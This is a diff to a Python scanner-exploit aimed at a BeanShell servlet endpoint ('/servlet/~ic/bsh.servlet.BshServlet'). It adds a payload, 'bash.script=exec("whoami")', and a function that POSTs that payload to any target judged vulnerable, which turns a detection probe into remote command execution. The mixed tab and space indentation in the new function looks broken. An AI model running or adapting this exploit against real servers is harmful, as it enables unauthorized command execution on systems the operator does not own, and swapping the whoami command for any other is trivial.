@@ -20,6 +20,8 @@ from queue import Queue
 PATH = '/servlet/~ic/bsh.servlet.BshServlet'
 GREEN = "\033[0;32;40m"
 END = "\033[0m"
+DATA = 'bash.script=exec("whoami")'
+
 
 def parser_args():
 	parser = argparse.ArgumentParser(epilog='\tExample: \r\npython ' + sys.argv[0] + " -u http://www.vulnsite.com")
@@ -38,15 +40,22 @@ def poc(url):
 				}
 		)
 		if response.status_code == 200 and 'BeanShell' in response.text:
-			print(GREEN + f"[+] {poc_url} is vulnerable" + END)
+			exp(poc_url)
 		else:
 			print(f"[-] {poc_url} is not vulnerable...")
 	except :
 		pass
 
 def exp(url):
-	poc(url)
-
+	try:
+		response = requests.post(url=url, headers={
+              "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
+              "Content-Type": "application/x-www-form-urlencoded"
+                  }, data=DATA)
+        if response.status_code == 200 and "trying to resolve variable" not in response.text:
+            print(GREEN + f"[+] {url} is vulnerable" + END)
+	except :
+        pass
 
 def one_target(url):
 	poc(url)
